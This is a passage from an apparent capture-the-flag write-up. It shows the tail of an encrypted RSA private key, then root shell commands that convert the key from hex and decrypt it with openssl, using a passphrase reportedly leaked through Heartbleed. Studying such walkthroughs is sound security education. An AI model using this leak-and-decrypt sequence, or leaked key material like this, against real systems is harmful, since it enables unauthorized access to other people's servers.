pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----

root@kali# cat mute_key | xxd -r -p > mute_key_encrypted

We can use openssl to try to decrypt. It asks for a password… the decode of the base64 collected with heartbleed, heartbleedbelievethehype works:

root@kali# openssl rsa -in mute_key_encrypted -out mute_key_decrypted
Enter pass phrase for mute_key_encrypted:
writing RSA key
```























